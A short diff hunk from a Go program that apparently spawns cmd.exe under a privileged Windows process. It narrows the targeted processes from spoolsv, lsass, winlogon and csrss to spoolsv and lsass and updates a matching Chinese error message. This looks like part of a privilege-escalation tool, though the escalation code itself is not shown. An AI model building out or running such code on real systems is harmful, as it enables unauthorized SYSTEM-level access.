@@ -70,10 +70,10 @@ func main(){
 	target := "C:\\Windows\\System32\\cmd.exe"
 	commandLine, err := syscall.UTF16PtrFromString(target)
 
-	targetPID := getpid([]string{"spoolsv","lsass","winlogon","csrss"})
+	targetPID := getpid([]string{"spoolsv","lsass"})
 
 	if targetPID == 0{
-		fmt.Println("未找到\"spoolsv\",\"lsass\",\"winlogon\",\"csrss\"进程")
+		fmt.Println("未找到\"spoolsv\",\"lsass\"进程")
 		return
 	}
 
